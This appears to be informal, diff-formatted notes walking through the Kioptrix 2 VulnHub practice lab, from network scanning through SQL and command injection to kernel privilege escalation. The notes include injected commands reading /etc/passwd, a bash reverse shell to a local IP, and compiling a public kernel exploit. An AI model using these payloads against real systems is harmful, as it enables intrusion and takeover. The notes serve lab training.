@@ -1,0 +1,58 @@
+Kioptrix 2 - VulnHub
+
+netdiscover -i eth0
+
+
+nmap -sC -sV 192.168.1.10
+
+
+nmap -p- 192.168.1.0
+
+
+dirb http://192.168.1.10
+
+
+192.168.1.10:80 &192.168.1.10:443
+
+
+
+SQL Injection
+
+
+*Don't forget to try queries with double and single quotes
+Login 
+
+
+This field is vulnerable to command injection using semicolon ;.
+
+;ls -la
+
+
+;cat /etc/passwd
+
+;bash -i >& /dev/tcp/192.168.1.5/8888 0>&1
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+ls -al
+we see index.php
+i found usernames and password for mysqlserver.We can log into mysql server using those credentials.
+
+The website runs a mysql server on port 3306.
+
+Privilege Escalation(ROOT)
+uname -a -no specific info
+lsb_release -a showed vulnerable kernel.
+
+
+
+search Cent0s 4.5 exploit
+
+Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1)
+
+
+
+Start a python server in order to grab this file from our victim machine.
+Grab it,compile it 
+gcc -o toRun 9542.c #compile it
+ make it executable run it and ROOOTEEEED!
+ 
